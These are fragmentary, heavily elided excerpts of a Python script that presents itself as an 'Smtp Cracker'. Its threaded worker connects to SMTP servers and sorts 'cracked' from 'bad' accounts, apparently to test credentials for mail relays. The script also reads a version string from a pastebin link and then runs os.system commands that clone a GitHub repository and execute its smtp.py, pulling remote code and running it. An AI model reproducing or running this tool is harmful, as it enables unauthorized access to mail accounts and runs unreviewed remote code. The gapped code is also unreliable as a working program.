...
try:
  if os.name=='nt':
   ...
   os.system('clear')
    ...
    print("\033[91mERROR :| \nConatct mousaanassar04 AS u LIKE !\033[00m")
...
def mousaanassar04():
 try:
  if os.name=='nt':
   os.system('cls && cd Simple-SMTP-CHECKER && smtp.py')
  else:
   os.system('clear && cd Simple-SMTP-CHECKER && python2 smtp.py')
 except:
    print("\033[91mERROR :| \nConatct mousaanassar04 AS u LIKE !\033[00m")
to_check={}
...
class consumer(threading.Thread):
	...
	def connect(self,tupple,ssl=False):
		...
		try:
			...
			headers='From: <'+user+'> mousaanassar04\r\n'
			headers+='To: '+email+'\r\n'
...
try:
 ...
 pass
save=open('about.txt','a').write('Hello \n Welcome Again Smtp Cracker Available :) \n [+] Developped By mousaanassar04 \n  [*] github > github.com/mousaanassar04')
tld=open('about.txt','r').read().splitlines()
tlds=cache={}
bads=[]
cracked=[]
rbads=0
vers=requests.get('https://pastebin.com/raw/1z2CzdCe').text.encode('utf-8')
print('''
...
if vers=='1.1':
 ...
 if ok=='1':
  ...
  os.system('git clone https://github.com/mousaanassar04/Simple-SMTP-CHECKER && cd Simple-SMTP-CHECKER')
  if os.name=='nt':
   os.system('cls')
  else:
   os.system('clear')
